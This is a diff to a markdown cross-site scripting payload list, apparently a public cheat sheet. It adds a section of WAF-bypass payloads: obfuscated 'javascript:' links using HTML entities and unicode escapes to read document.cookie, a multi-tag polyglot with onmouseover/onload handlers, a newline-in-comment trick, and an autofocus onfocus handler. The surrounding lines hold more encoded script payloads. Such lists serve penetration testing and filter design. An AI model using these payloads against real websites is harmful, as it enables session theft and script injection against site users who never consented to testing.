@@ -852,6 +852,14 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 <a href=javas&#99;ript:alert(1)>
 ```
 
+### Some WAF Bypass by [@wugeej](https://twitter.com/wugeej)
+```html
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">
+<a href="javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>">
+<a href="javascript://comment%0a%0dalert(0);">
+<input onfocus="alert(0);" autofocus>
+```
+
 ## More fun
 
 This section will be used for the "fun/interesting/useless" stuff.
